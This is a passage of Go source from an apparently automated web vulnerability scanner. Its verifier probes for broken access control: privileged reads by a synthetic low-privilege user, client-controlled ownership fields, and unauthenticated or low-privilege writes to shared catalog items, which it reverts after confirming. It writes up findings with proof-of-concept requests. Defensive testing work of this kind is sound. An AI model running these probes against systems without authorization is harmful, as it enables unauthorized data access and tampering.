	if lower == "" || !strings.HasPrefix(lower, "/") {
		return false
	}
	for _, blocked := range []string{
		"/assets/", "/static/", "/dist/", "/fonts/", "/images/", ".js", ".css",
		".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".map",
		"challenge", "score", "captcha", "securityquestion", "metrics",
		"health", "swagger", "openapi", "application-version",
		"application-configuration", "languages", "quantity", "products",
		"product", "catalog", "basket", "cart", "checkout", "login", "logout",
		"session", "whoami", "/me", "profile", "password-reset",
	} {
		if strings.Contains(lower, blocked) {
			return false
		}
	}
	for _, allowed := range []string{
		"admin", "manage", "management", "moderation", "moderator", "support",
		"audit", "log", "users", "user", "accounts", "customers", "feedbacks",
		"feedback", "complaints", "complaint", "reports", "report", "tickets",
	} {
		if strings.Contains(lower, allowed) {
			return true
		}
	}
	return false
}

func privilegedReadPathPriority(path string) int {
	lower := strings.ToLower(path)
	score := 10
	for _, marker := range []string{"admin", "management", "manage", "audit", "support"} {
		if strings.Contains(lower, marker) {
			score += 25
		}
	}
	for _, marker := range []string{"users", "accounts", "customers"} {
		if strings.Contains(lower, marker) {
			score += 20
		}
	}
	for _, marker := range []string{"feedback", "complaint", "report", "ticket", "moderation", "log"} {
		if strings.Contains(lower, marker) {
			score += 14
		}
	}
	return score
}

func privilegedReadResponseSignal(path, contentType, body string) apiExposureSignal {
	if signal := sensitiveAPIExposureSignalDetail(contentType, body); signal.Signal != "" {
		return signal
	}
	trimmed := strings.TrimSpace(body)
	if trimmed == "" {
		return apiExposureSignal{}
	}
	lowerCT := strings.ToLower(contentType)
	lowerPrefix := strings.ToLower(firstNRunes(trimmed, 200))
	if strings.Contains(lowerCT, "html") || strings.Contains(lowerPrefix, "<html") || strings.Contains(lowerPrefix, "<!doctype html") {
		if signal := privilegedHTMLSignal(trimmed); signal.Signal != "" {
			return signal
		}
	}
	if !strings.Contains(lowerCT, "json") && !strings.HasPrefix(trimmed, "{") && !strings.HasPrefix(trimmed, "[") {
		return apiExposureSignal{}
	}
	var parsed any
	if err := json.Unmarshal([]byte(trimmed), &parsed); err != nil {
		return apiExposureSignal{}
	}
	if signal := moderationOrSupportCollectionSignal(parsed); signal.Signal != "" {
		return signal
	}
	if privilegedReadPathLooksRelevant(path) {
		objects, ownerFields, contentFields := moderationCollectionFacts(parsed)
		if objects >= 2 && ownerFields >= 1 && contentFields >= 1 {
			return apiExposureSignal{
				Signal:   "privileged-looking collection exposes owner-linked workflow/content records",
				Severity: types.SeverityMedium,
				Class:    apiExposurePersonalData,
			}
		}
	}
	return apiExposureSignal{}
}

func privilegedHTMLSignal(html string) apiExposureSignal {
	lower := strings.ToLower(html)
	if !(strings.Contains(lower, "admin") || strings.Contains(lower, "management") ||
		strings.Contains(lower, "moderation") || strings.Contains(lower, "support")) {
		return apiExposureSignal{}
	}
	hits := 0
	for _, marker := range []string{
		"user management", "admin panel", "admin dashboard", "support tickets",
		"audit log", "moderation queue", "manage users", "customer list",
	} {
		if strings.Contains(lower, marker) {
			hits++
		}
	}
	if hits == 0 {
		return apiExposureSignal{}
	}
	return apiExposureSignal{
		Signal:   "privileged admin/support HTML marker(s) rendered",
		Severity: types.SeverityMedium,
		Class:    apiExposureUserAuthzData,
	}
}

func moderationOrSupportCollectionSignal(value any) apiExposureSignal {
	objects, ownerFields, contentFields := moderationCollectionFacts(value)
	if objects >= 2 && ownerFields >= 1 && contentFields >= 2 {
		return apiExposureSignal{
			Signal:   "moderation/support collection exposes multiple owner-linked content records",
			Severity: types.SeverityMedium,
			Class:    apiExposurePersonalData,
		}
	}
	return apiExposureSignal{}
}

func moderationCollectionFacts(value any) (objects, ownerFields, contentFields int) {
	var walk func(any)
	walk = func(v any) {
		switch typed := v.(type) {
		case map[string]any:
			objects++
			for key, child := range typed {
				norm := normalizeJSONKey(key)
				if ownerJSONKey(norm) || norm == "userid" || norm == "customerid" || norm == "accountid" || norm == "ownerid" {
					if meaningfulJSONValue(child) {
						ownerFields++
					}
				}
				switch norm {
				case "comment", "message", "description", "body", "text", "status", "rating", "subject", "title", "ticketid", "complaintid", "feedbackid":
					if meaningfulJSONValue(child) {
						contentFields++
					}
				}
				walk(child)
			}
		case []any:
			for _, child := range typed {
				walk(child)
			}
		}
	}
	walk(value)
	return objects, ownerFields, contentFields
}

func (v *VerifierAgent) storeLowPrivilegePrivilegedReadFinding(candidate privilegedReadCandidate, persona syntheticAuthPersona, result privilegedReadResult) {
	title := fmt.Sprintf("Low-privileged user can read privileged endpoint %s", candidate.Path)
	description := fmt.Sprintf(
		"%s returned privileged-looking data to a synthetic ordinary user (%s). Anonymous baseline status=%d; source=%s.",
		candidate.Path, result.Signal.Signal, result.AnonStatus, candidate.Source)
	redactedAnon := redact.Text(result.AnonBody)
	redactedAuth := redact.Text(result.AuthBody)
	evidence := fmt.Sprintf(
		"Synthetic user: %s (id=%d)\nURL: %s\nAnonymous status: %d\nAuthenticated status: %d\nSignal: %s\nAnonymous preview: %s\nAuthenticated preview: %s",
		persona.Email, persona.UserID, candidate.URL, result.AnonStatus, result.AuthStatus,
		result.Signal.Signal, truncateString(redactedAnon, 600), truncateString(redactedAuth, 1000))
	profile := types.PageProfile{ID: "GET " + candidate.Path, URL: candidate.URL, Method: http.MethodGet}
	v.storeFinding(profile, types.Finding{
		Title:       title,
		Description: description,
		Severity:    result.Signal.Severity,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  "GET " + candidate.Path,
		VulnType:    "broken_access_control_privileged_read",
		ParamName:   "role",
		Payload:     "synthetic low-privileged user session",
		PocRequest: fmt.Sprintf(
			"GET %s HTTP/1.1\nHost: <target>\nAuthorization: Bearer <synthetic low-privileged user token>\n\n",
			candidate.Path),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s", result.AuthStatus, truncateString(redactedAuth, 1000)),
		StepsToReproduce: fmt.Sprintf(
			"1. Register/login a normal low-privileged user.\n"+
				"2. Send GET %s with that user's session.\n"+
				"3. Observe HTTP %d and privileged data signal: %s.\n"+
				"4. Compare anonymous baseline status %d to confirm this is role-bound exposure, not merely public content.",
			candidate.Path, result.AuthStatus, result.Signal.Signal, result.AnonStatus),
		Impact: "A normal account can read privileged admin/support/moderation or user-management data. " +
			"This can expose users, customers, tickets, audit records, moderation content, or role metadata and gives attackers reconnaissance for follow-on account and business-logic abuse.",
		Remediation: "Enforce server-side role/permission checks on every privileged read endpoint. Do not rely on hidden UI routes; validate authorization from trusted session state before returning collections or management records.",
		Evidence:    evidence,
	})
}

func mustJSON(value any) string {
	body, err := json.Marshal(value)
	if err != nil {
		return "{}"
	}
	return string(body)
}

func mutableOwnershipBasketIDFromHeaders(headers map[string]string) (int64, bool) {
	for _, token := range jwtTokensFromHeaders(headers) {
		_, payload, _, ok := jwtDecodeSignedJWTPayload(token)
		if !ok {
			continue
		}
		if bid, ok := nestedInt64(payload, "bid"); ok {
			return bid, true
		}
		for _, key := range []string{"basketId", "BasketId", "cartId", "CartId"} {
			if bid, ok := nestedInt64(payload, key); ok {
				return bid, true
			}
		}
	}
	return 0, false
}

func mutableOwnershipProductIDFromTraffic(entries []types.TrafficEntry) int64 {
	ids := mutableOwnershipProductIDsFromTraffic(entries, 1)
	if len(ids) == 0 {
		return 0
	}
	return ids[0]
}

func mutableOwnershipProductIDsFromTraffic(entries []types.TrafficEntry, limit int) []int64 {
	if limit <= 0 {
		limit = 8
	}
	seen := make(map[int64]bool)
	var out []int64
	add := func(id int64) bool {
		if id <= 0 || seen[id] {
			return false
		}
		seen[id] = true
		out = append(out, id)
		return len(out) >= limit
	}
	for _, entry := range entries {
		if entry.Response.StatusCode < 200 || entry.Response.StatusCode >= 300 {
			continue
		}
		text := strings.ToLower(entry.Request.Path + " " + entry.Request.URL)
		if !strings.Contains(text, "product") && !strings.Contains(text, "quantity") && !strings.Contains(text, "catalog") && !strings.Contains(text, "search") {
			continue
		}
		for _, id := range jsonPositiveIntsForKeys(string(entry.Response.Body), "ProductId", "productId", "product_id") {
			if add(id) {
				return out
			}
		}
		if strings.Contains(text, "product") || strings.Contains(text, "catalog") || strings.Contains(text, "search") {
			for _, id := range jsonPositiveIntsForKeys(string(entry.Response.Body), "id") {
				if add(id) {
					return out
				}
			}
		}
	}
	return out
}

func jsonNestedInt64(body string, key string) (int64, bool) {
	var decoded any
	if err := json.Unmarshal([]byte(body), &decoded); err != nil {
		return 0, false
	}
	return nestedInt64(decoded, key)
}

func jsonFirstPositiveIntForKeys(body string, keys ...string) (int64, bool) {
	for _, n := range jsonPositiveIntsForKeys(body, keys...) {
		if n > 0 {
			return n, true
		}
	}
	return 0, false
}

func jsonPositiveIntsForKeys(body string, keys ...string) []int64 {
	var decoded any
	if err := json.Unmarshal([]byte(body), &decoded); err != nil {
		return nil
	}
	seen := make(map[int64]bool)
	var out []int64
	for _, key := range keys {
		collectNestedPositiveInts(decoded, key, seen, &out, 32)
	}
	return out
}

func collectNestedPositiveInts(value any, key string, seen map[int64]bool, out *[]int64, limit int) {
	if len(*out) >= limit {
		return
	}
	switch typed := value.(type) {
	case map[string]any:
		for k, item := range typed {
			if strings.EqualFold(k, key) {
				if n, ok := integerLikeValue(item); ok && n > 0 && !seen[n] {
					seen[n] = true
					*out = append(*out, n)
					if len(*out) >= limit {
						return
					}
				} else if s, ok := item.(string); ok {
					if n, ok := parseSmallInt64(strings.TrimSpace(s)); ok && n > 0 && !seen[n] {
						seen[n] = true
						*out = append(*out, n)
						if len(*out) >= limit {
							return
						}
					}
				}
			}
		}
		for _, item := range typed {
			collectNestedPositiveInts(item, key, seen, out, limit)
			if len(*out) >= limit {
				return
			}
		}
	case []any:
		for _, item := range typed {
			collectNestedPositiveInts(item, key, seen, out, limit)
			if len(*out) >= limit {
				return
			}
		}
	}
}

func nestedInt64(value any, key string) (int64, bool) {
	switch typed := value.(type) {
	case map[string]any:
		for k, item := range typed {
			if strings.EqualFold(k, key) {
				if n, ok := integerLikeValue(item); ok {
					return n, true
				}
				if s, ok := item.(string); ok {
					if n, ok := parseSmallInt64(strings.TrimSpace(s)); ok {
						return n, true
					}
				}
			}
		}
		for _, item := range typed {
			if n, ok := nestedInt64(item, key); ok {
				return n, true
			}
		}
	case []any:
		for _, item := range typed {
			if n, ok := nestedInt64(item, key); ok {
				return n, true
			}
		}
	}
	return 0, false
}

func (v *VerifierAgent) storeMutableOwnershipFinding(candidate mutableOwnershipCandidate, field string, mutated any, body map[string]any, result mutableOwnershipResult, signal string) {
	bodyBytes, _ := json.Marshal(body)
	path := candidate.Path
	if path == "" {
		path = candidate.URL
	}
	method := candidate.Method
	if method == "" {
		method = "POST"
	}
	title := fmt.Sprintf("Client-controlled ownership field %q accepted at %s", field, path)
	description := fmt.Sprintf(
		"%s accepted an object write where client-controlled ownership/foreign-key field %q was changed to %s. The response confirmed %s. Source: %s.",
		path, field, summarizeJSONValue(mutated), signal, candidate.Source)
	evidence := fmt.Sprintf("Write URL: %s\nField: %s\nMutated value: %s\nAccepted signal: %s\nStatus: %d\nAuth source: %s\nResponse preview: %s",
		candidate.URL, field, summarizeJSONValue(mutated), signal, result.Status, result.AuthSource, truncateString(result.Body, 700))
	profile := types.PageProfile{ID: method + " " + path, URL: candidate.URL, Method: method}
	v.storeFinding(profile, types.Finding{
		Title:       title,
		Description: description,
		Severity:    types.SeverityHigh,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  method + " " + path,
		VulnType:    "mutable_ownership_bac",
		ParamName:   field,
		Payload:     summarizeJSONValue(mutated),
		PocRequest: fmt.Sprintf("%s %s HTTP/1.1\nHost: <target>\nAuthorization: <captured same-origin credential>\nContent-Type: application/json\n\n%s",
			method, path, string(bodyBytes)),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s", result.Status, truncateString(result.Body, 800)),
		StepsToReproduce: fmt.Sprintf(
			"1. Authenticate as a normal user.\n"+
				"2. Send a %s request to %s with ownership/foreign-key field %q set to %s.\n"+
				"3. Observe the server responds %d and confirms %s.",
			method, path, field, summarizeJSONValue(mutated), result.Status, signal),
		Impact: "Mutable ownership fields let attackers move, create, or update objects under another user's account, tenant, cart, order, or organization. " +
			"This is a direct broken-access-control primitive and often chains into IDOR, order manipulation, and account data exposure.",
		Remediation: "Derive ownership fields server-side from the authenticated subject and immutable route context. Ignore or reject client-supplied owner/account/cart/tenant identifiers, and verify authorization before every object write.",
		Evidence:    evidence,
	})
}

type lowPrivilegeDeleteCandidate struct {
	URL         string
	Path        string
	ItemID      int64
	OwnerField  string
	OwnerID     int64
	ObjectLabel string
	Source      string
	BodyPreview string
	Priority    int
}

type syntheticAuthPersona struct {
	Email   string
	UserID  int64
	Headers map[string]string
	Source  string
}

type catalogEntityWriteCandidate struct {
	URL           string
	Path          string
	ReadURL       string
	ReadPath      string
	ID            int64
	Field         string
	OriginalValue any
	Object        map[string]any
	ObjectLabel   string
	Source        string
	Priority      int
}

type catalogEntityWriteResult struct {
	Method        string
	Body          map[string]any
	Status        int
	ResponseBody  string
	ReadStatus    int
	ReadBody      string
	Signal        string
	AuthSource    string
	RestoreStatus int
	RestoreOK     bool
	RestoreBody   string
}

var catalogEntityOutboundURLRE = regexp.MustCompile(`https?://[^\s"'<>),]+`)

// probeCatalogEntityWriteAuthorization checks a human-pentester invariant:
// shared catalog/listing entities are usually managed by privileged workflows,
// not by arbitrary anonymous or ordinary users. The proof is deliberately
// bounded to one reversible text-field marker with readback confirmation.
func (v *VerifierAgent) probeCatalogEntityWriteAuthorization(ctx context.Context, target string) {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return
	}
	candidates := catalogEntityWriteCandidatesFromTraffic(entries, target)
	if len(candidates) == 0 {
		return
	}
	if v.authority != policy.AuthorityFullControl {
		v.db.InsertNarration(v.scanID, "verifier", "skipped",
			fmt.Sprintf("Found %d shared catalog/listing write candidate(s), but skipped mutation proof because testing authority is %q.",
				len(candidates), firstNonBlank(string(v.authority), string(policy.AuthorityActive))),
			target, map[string]any{"required_authority": policy.AuthorityFullControl})
		return
	}

	v.db.InsertNarration(v.scanID, "verifier", "attempt",
		fmt.Sprintf("Testing %d inferred shared catalog/listing entity endpoint(s) for missing write authorization.",
			len(candidates)),
		target, nil)

	personaTried := false
	var persona syntheticAuthPersona
	var personaOK bool
	personaAttempt := func() (projectionAuthAttempt, bool) {
		if !personaTried {
			personaTried = true
			persona, personaOK = v.ensureSyntheticLowPrivilegePersona(ctx, target, entries)
		}
		if !personaOK || len(persona.Headers) == 0 {
			return projectionAuthAttempt{}, false
		}
		headers := activeWriteAuthHeaders(persona.Headers)
		if len(headers) == 0 {
			headers = cloneHeaderMap(persona.Headers)
		}
		return projectionAuthAttempt{
			Headers: headers,
			Source:  fmt.Sprintf("synthetic low-privileged user %s", persona.Email),
		}, true
	}

	const maxCandidates = 4
	for i, candidate := range candidates {
		if ctx.Err() != nil || i >= maxCandidates {
			return
		}
		if result, ok := v.tryCatalogEntityWrite(ctx, candidate, projectionAuthAttempt{Source: "unauthenticated request"}); ok {
			v.confirmed++
			v.storeCatalogEntityWriteFinding(candidate, persona, result)
			v.db.InsertNarration(v.scanID, "verifier", "confirmed",
				fmt.Sprintf("%s accepted %s=%s via %s (%s).",
					candidate.Path, candidate.Field, summarizeJSONValue(result.Body[candidate.Field]), result.AuthSource, result.Signal),
				candidate.URL, map[string]any{
					"auth_source": result.AuthSource,
					"field":       candidate.Field,
					"readback":    candidate.ReadURL,
					"restore_ok":  result.RestoreOK,
				})
			return
		}
		auth, ok := personaAttempt()
		if !ok {
			continue
		}
		if result, ok := v.tryCatalogEntityWrite(ctx, candidate, auth); ok {
			v.confirmed++
			v.storeCatalogEntityWriteFinding(candidate, persona, result)
			v.db.InsertNarration(v.scanID, "verifier", "confirmed",
				fmt.Sprintf("%s accepted low-privileged %s=%s (%s).",
					candidate.Path, candidate.Field, summarizeJSONValue(result.Body[candidate.Field]), result.Signal),
				candidate.URL, map[string]any{
					"auth_source":     result.AuthSource,
					"persona_user_id": persona.UserID,
					"field":           candidate.Field,
					"readback":        candidate.ReadURL,
					"restore_ok":      result.RestoreOK,
				})
			return
		}
	}
}

func (v *VerifierAgent) tryCatalogEntityWrite(ctx context.Context, candidate catalogEntityWriteCandidate, auth projectionAuthAttempt) (catalogEntityWriteResult, bool) {
	marker := fmt.Sprintf("aobtd-catalog-%d", time.Now().UnixNano())
	methods := []string{http.MethodPut, http.MethodPatch}
	for _, method := range methods {
		for _, body := range catalogEntityWriteBodies(candidate, marker) {
			if ctx.Err() != nil {
				return catalogEntityWriteResult{}, false
			}
			bodyBytes, _ := json.Marshal(body)
			status, respBody, ok := v.sendJSONWithHeaders(ctx, method, candidate.URL, bodyBytes, auth.Headers,
				"AOBTD/Verifier (catalog entity write authorization probe)")
			v.tested++
			if !ok {
				continue
			}
			if status < 200 || status >= 300 {
				v.dismissed++
				continue
			}
			respSignal := catalogEntityWriteSignal(respBody, candidate.Field, marker)
			readResp, readBody, _, err := v.proactiveGETWithHeaders(ctx, candidate.ReadURL, auth.Headers,
				"AOBTD/Verifier (catalog entity write readback)")
			v.tested++
			if err != nil || readResp == nil || readResp.StatusCode < 200 || readResp.StatusCode >= 300 {
				if err == nil {
					v.dismissed++
				}
				continue
			}
			readSignal := catalogEntityWriteSignal(readBody, candidate.Field, marker)
			if readSignal == "" {
				v.dismissed++
				continue
			}
			signal := readSignal
			if respSignal != "" {
				signal = respSignal + "; readback " + readSignal
			}
			result := catalogEntityWriteResult{
				Method:       method,
				Body:         body,
				Status:       status,
				ResponseBody: respBody,
				ReadStatus:   readResp.StatusCode,
				ReadBody:     readBody,
				Signal:       signal,
				AuthSource:   firstNonBlank(auth.Source, "unauthenticated request"),
			}
			result.RestoreStatus, result.RestoreBody, result.RestoreOK = v.restoreCatalogEntityWrite(ctx, candidate, method, auth.Headers, marker)
			return result, true
		}
	}
	return catalogEntityWriteResult{}, false
}

func (v *VerifierAgent) restoreCatalogEntityWrite(ctx context.Context, candidate catalogEntityWriteCandidate, method string, headers map[string]string, marker string) (int, string, bool) {
	restoreBody := map[string]any{candidate.Field: candidate.OriginalValue}
	bodyBytes, _ := json.Marshal(restoreBody)
	status, respBody, ok := v.sendJSONWithHeaders(ctx, method, candidate.URL, bodyBytes, headers,
		"AOBTD/Verifier (catalog entity write restore)")
	v.tested++
	if !ok || status < 200 || status >= 300 {
		if ok {
			v.dismissed++
		}
		return status, respBody, false
	}
	readResp, readBody, _, err := v.proactiveGETWithHeaders(ctx, candidate.ReadURL, headers,
		"AOBTD/Verifier (catalog entity restore readback)")
	v.tested++
	if err != nil || readResp == nil || readResp.StatusCode < 200 || readResp.StatusCode >= 300 {
		if err == nil {
			v.dismissed++
		}
		return status, respBody, false
	}
	return status, respBody, !jsonBodyContainsString(readBody, marker)
}

func catalogEntityWriteCandidatesFromTraffic(entries []types.TrafficEntry, target string) []catalogEntityWriteCandidate {
	origin := originFromURL(target)
	if origin == "" {
		for _, entry := range entries {
			origin = originFromURL(entry.Request.URL)
			if origin != "" {
				break
			}
		}
	}
	if origin == "" {
		return nil
	}
	origin = strings.TrimRight(origin, "/")

	seen := make(map[string]bool)
	var out []catalogEntityWriteCandidate
	for _, entry := range entries {
		method := strings.ToUpper(entry.Request.Method)
		if method != http.MethodGet ||
			entry.Response.StatusCode < 200 || entry.Response.StatusCode >= 300 ||
			len(entry.Response.Body) == 0 ||
			!catalogEntityPathLooksShared(entry.Request.Path+" "+entry.Request.URL) {
			continue
		}
		ct := strings.ToLower(entry.Response.ContentType)
		if !strings.Contains(ct, "json") && !json.Valid(entry.Response.Body) {
			continue
		}
		objects := jsonObjectArrayFromEnvelope(entry.Response.Body)
		if len(objects) == 0 {
			continue
		}
		path := requestPathFromTrafficEntry(entry)
		if path == "" {
			continue
		}
		updatePaths := catalogEntityUpdatePathTemplates(path)
		if len(updatePaths) == 0 {
			continue
		}
		for _, obj := range objects {
			if catalogEntityObjectLooksProbeGenerated(obj) {
				continue
			}
			id, ok := jsonObjectPositiveInt(obj, "id", "ID", "productId", "ProductId", "itemId", "item_id")
			if !ok {
				continue
			}
			field, original, ok := catalogEntityMutableTextField(obj)
			if !ok {
				continue
			}
			for _, pathTemplate := range updatePaths {
				updatePath := fmt.Sprintf(pathTemplate, id)
				key := updatePath + "|" + field
				if seen[key] {
					continue
				}
				seen[key] = true
				readURL := origin + updatePath
				out = append(out, catalogEntityWriteCandidate{
					URL:           readURL,
					Path:          updatePath,
					ReadURL:       readURL,
					ReadPath:      updatePath,
					ID:            id,
					Field:         field,
					OriginalValue: original,
					Object:        obj,
					ObjectLabel:   catalogEntityObjectLabel(path),
					Source:        "observed shared catalog/listing JSON collection with mutable display fields",
					Priority:      catalogEntityWritePriority(path, id, field, obj),
				})
				if len(out) >= 64 {
					return sortCatalogEntityWriteCandidates(out)
				}
			}
		}
	}
	return sortCatalogEntityWriteCandidates(out)
}

func requestPathFromTrafficEntry(entry types.TrafficEntry) string {
	path := strings.TrimSpace(entry.Request.Path)
	if path == "" {
		if parsed, err := url.Parse(entry.Request.URL); err == nil {
			path = parsed.Path
		}
	}
	if path == "" {
		return ""
	}
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	return strings.TrimRight(path, "/")
}

func catalogEntityPathLooksShared(text string) bool {
	lower := strings.ToLower(text)
	for _, blocked := range []string{
		"basket", "cart", "checkout", "order", "invoice", "payment", "wallet",
		"user", "account", "profile", "auth", "login", "session",
		"feedback", "review", "comment", "message", "complaint", "report",
		"captcha", "challenge", "securityquestion", "quantity", "metrics",
	} {
		if strings.Contains(lower, blocked) {
			return false
		}
	}
	for _, term := range []string{
		"product", "catalog", "listing", "inventory", "sku", "item", "menu",
		"plan", "package", "service", "asset",
	} {
		if strings.Contains(lower, term) {
			return true
		}
	}
	return false
}

func catalogEntityUpdatePathTemplates(path string) []string {
	path = strings.TrimSpace(path)
	if path == "" {
		return nil
	}
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	path = strings.Split(path, "?")[0]
	path = strings.TrimRight(path, "/")

	seen := make(map[string]bool)
	var out []string
	add := func(candidate string) {
		candidate = strings.TrimSpace(candidate)
		if candidate == "" {
			return
		}
		if !strings.HasPrefix(candidate, "/") {
			candidate = "/" + candidate
		}
		candidate = strings.TrimRight(candidate, "/")
		if !strings.Contains(candidate, "%d") {
			candidate += "/%d"
		}
		if seen[candidate] {
			return
		}
		seen[candidate] = true
		out = append(out, candidate)
	}

	segments := pathSegments(path)
	if len(segments) > 0 {
		if _, ok := parseSmallInt64(segments[len(segments)-1]); ok {
			templated := append([]string{}, segments[:len(segments)-1]...)
			templated = append(templated, "%d")
			add("/" + strings.Join(templated, "/"))
		} else {
			base := path
			if strings.EqualFold(segments[len(segments)-1], "search") || strings.EqualFold(segments[len(segments)-1], "list") {
				base = "/" + strings.Join(segments[:len(segments)-1], "/")
			}
			add(base)
		}
	}
	if len(segments) >= 2 && strings.EqualFold(segments[0], "rest") {
		resource := segments[1]
		if resource != "" {
			add("/api/" + resource)
			add("/api/" + titleCaseASCII(resource))
		}
	}
	return out
}

func pathSegments(path string) []string {
	raw := strings.Split(strings.Trim(path, "/"), "/")
	var out []string
	for _, segment := range raw {
		segment = strings.TrimSpace(segment)
		if segment != "" {
			out = append(out, segment)
		}
	}
	return out
}

func titleCaseASCII(value string) string {
	value = strings.TrimSpace(value)
	if value == "" {
		return ""
	}
	if len(value) == 1 {
		return strings.ToUpper(value)
	}
	return strings.ToUpper(value[:1]) + value[1:]
}

func catalogEntityMutableTextField(obj map[string]any) (string, any, bool) {
	for _, want := range []string{"description", "summary", "name", "title", "label", "displayName", "image"} {
		for key, value := range obj {
			if !strings.EqualFold(key, want) {
				continue
			}
			text, ok := value.(string)
			if !ok {
				continue
			}
			text = strings.TrimSpace(text)
			if text == "" || len(text) > 500 {
				continue
			}
			return key, value, true
		}
	}
	return "", nil, false
}

func catalogEntityObjectLooksProbeGenerated(obj map[string]any) bool {
	for _, value := range obj {
		text, ok := value.(string)
		if !ok {
			continue
		}
		if strings.Contains(strings.ToLower(text), "aobtd") {
			return true
		}
	}
	return false
}

func catalogEntityWritePriority(path string, id int64, field string, obj map[string]any) int {
	score := 0
	lower := strings.ToLower(path)
	for _, term := range []string{"product", "catalog", "listing", "inventory"} {
		if strings.Contains(lower, term) {
			score += 5
			break
		}
	}
	switch strings.ToLower(field) {
	case "description", "summary":
		score += 4
	case "name", "title", "label":
		score += 2
	}
	if original, ok := obj[field].(string); ok && catalogEntityTextContainsOutboundLink(original) {
		score += 8
	}
	if id > 0 && id < 1000 {
		score += 2
	}
	if catalogEntityObjectLooksProbeGenerated(obj) {
		score -= 20
	}
	return score
}

func sortCatalogEntityWriteCandidates(candidates []catalogEntityWriteCandidate) []catalogEntityWriteCandidate {
	sort.SliceStable(candidates, func(i, j int) bool {
		if candidates[i].Priority != candidates[j].Priority {
			return candidates[i].Priority > candidates[j].Priority
		}
		if candidates[i].ID != candidates[j].ID {
			return candidates[i].ID < candidates[j].ID
		}
		return candidates[i].Path < candidates[j].Path
	})
	if len(candidates) > 8 {
		return candidates[:8]
	}
	return candidates
}

func catalogEntityObjectLabel(path string) string {
	lower := strings.ToLower(path)
	switch {
	case strings.Contains(lower, "product"):
		return "product"
	case strings.Contains(lower, "catalog"):
		return "catalog item"
	case strings.Contains(lower, "listing"):
		return "listing"
	case strings.Contains(lower, "inventory"):
		return "inventory item"
	case strings.Contains(lower, "plan"):
		return "plan"
	case strings.Contains(lower, "service"):
		return "service"
	default:
		return "shared entity"
	}
}

func catalogEntityWriteBodies(candidate catalogEntityWriteCandidate, marker string) []map[string]any {
	var out []map[string]any
	if original, ok := candidate.OriginalValue.(string); ok {
		if replacement, ok := catalogEntityLinkTamperValue(original, marker); ok {
			out = append(out, map[string]any{candidate.Field: replacement})
			if full, ok := cloneJSONMapDeep(candidate.Object); ok {
				full[candidate.Field] = replacement
				out = append(out, full)
			}
		}
	}
	partial := map[string]any{candidate.Field: marker}
	out = append(out, partial)
	if full, ok := cloneJSONMapDeep(candidate.Object); ok {
		full[candidate.Field] = marker
		out = append(out, full)
	}
	return out
}

func catalogEntityTextContainsOutboundLink(text string) bool {
	return catalogEntityOutboundURLRE.MatchString(text)
}

func catalogEntityLinkTamperValue(original, marker string) (string, bool) {
	original = strings.TrimSpace(original)
	marker = strings.TrimSpace(marker)
	if original == "" || marker == "" {
		return "", false
	}
	loc := catalogEntityOutboundURLRE.FindStringIndex(original)
	if loc == nil {
		return "", false
	}
	replacement := "https://example.com/" + marker
	return original[:loc[0]] + replacement + original[loc[1]:], true
}

func catalogEntityWriteSignal(body, field, marker string) string {
	if strings.TrimSpace(body) == "" || marker == "" {
		return ""
	}
	if signal := mutableOwnershipAcceptanceSignal(field, marker, body); signal != "" {
		return signal
	}
	if jsonBodyContainsString(body, marker) {
		return "body contains marker"
	}
	return ""
}

func (v *VerifierAgent) storeCatalogEntityWriteFinding(candidate catalogEntityWriteCandidate, persona syntheticAuthPersona, result catalogEntityWriteResult) {
	bodyBytes, _ := json.Marshal(result.Body)
	title := fmt.Sprintf("Shared %s can be modified through %s", candidate.ObjectLabel, candidate.Path)
	severity := types.SeverityHigh
	if strings.Contains(strings.ToLower(result.AuthSource), "low-privileged") {
		title = fmt.Sprintf("Low-privileged user can modify shared %s at %s", candidate.ObjectLabel, candidate.Path)
	} else {
		title = fmt.Sprintf("Unauthenticated client can modify shared %s at %s", candidate.ObjectLabel, candidate.Path)
	}
	description := fmt.Sprintf(
		"%s accepted a %s request from %s that changed %q on shared %s %d. A read-back of %s confirmed %s. Source: %s.",
		candidate.Path, result.Method, result.AuthSource, candidate.Field, candidate.ObjectLabel, candidate.ID,
		candidate.ReadPath, result.Signal, candidate.Source)
	evidence := fmt.Sprintf(
		"Write URL: %s\nRead-back URL: %s\nAuth source: %s\nSynthetic user: %s (id=%d)\nField: %s\nOriginal value: %s\nWrite body: %s\nWrite status: %d\nRead status: %d\nSignal: %s\nRestore attempted: status=%d ok=%t\nWrite response: %s\nRead-back preview: %s",
		candidate.URL, candidate.ReadURL, result.AuthSource, persona.Email, persona.UserID, candidate.Field,
		summarizeJSONValue(candidate.OriginalValue), string(bodyBytes), result.Status, result.ReadStatus,
		result.Signal, result.RestoreStatus, result.RestoreOK, truncateString(result.ResponseBody, 700),
		truncateString(result.ReadBody, 900))
	if !result.RestoreOK {
		evidence += "\nRestore response: " + truncateString(result.RestoreBody, 500)
	}
	profile := types.PageProfile{ID: result.Method + " " + candidate.Path, URL: candidate.URL, Method: result.Method}
	v.storeFinding(profile, types.Finding{
		Title:       title,
		Description: description,
		Severity:    severity,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  result.Method + " " + candidate.Path,
		VulnType:    "catalog_entity_write_authorization_bypass",
		ParamName:   candidate.Field,
		Payload:     summarizeJSONValue(result.Body[candidate.Field]),
		PocRequest: fmt.Sprintf(
			"%s %s HTTP/1.1\nHost: <target>\nContent-Type: application/json\n\n%s",
			result.Method, candidate.Path, string(bodyBytes)),
		PocResponse: fmt.Sprintf("Write response:\nHTTP/1.1 %d\n\n%s\n\nRead-back response:\nHTTP/1.1 %d\n\n%s",
			result.Status, truncateString(result.ResponseBody, 800), result.ReadStatus, truncateString(result.ReadBody, 900)),
		StepsToReproduce: fmt.Sprintf(
			"1. As %s, send %s %s with body %s.\n"+
				"2. GET %s.\n"+
				"3. Observe the shared %s %d now contains %s.\n"+
				"4. Restore %q to its original value and verify the marker disappears.",
			result.AuthSource, result.Method, candidate.Path, string(bodyBytes), candidate.ReadPath,
			candidate.ObjectLabel, candidate.ID, result.Signal, candidate.Field),
		Impact: "Attackers can alter shared catalog/listing data that other users trust for discovery, pricing context, content, inventory, or downstream business decisions. " +
